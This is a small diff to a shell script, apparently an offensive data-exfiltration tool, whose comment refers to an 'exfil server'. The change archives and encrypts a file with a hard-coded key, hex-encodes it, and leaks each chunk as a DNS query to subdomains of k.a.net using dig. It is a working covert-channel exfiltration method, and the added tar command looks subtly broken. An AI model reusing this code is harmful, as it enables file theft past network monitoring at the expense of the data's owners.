@@ -11,7 +11,9 @@ usage (){
 # this will need to be adjusted to point to the exfil server name that is controlled
 
 if [ $1 ]; then
-  xxd -p $1 > $1.hex
+
+  tar -P -zcf $1 | openssl aes-128-cbc -out $1.tar.gz -k 1234
+  xxd -p $1.tar.gz > $1.hex
   for dnsx in `cat $1.hex `; do dig $dnsx.k.a.net; done
 
 else usage
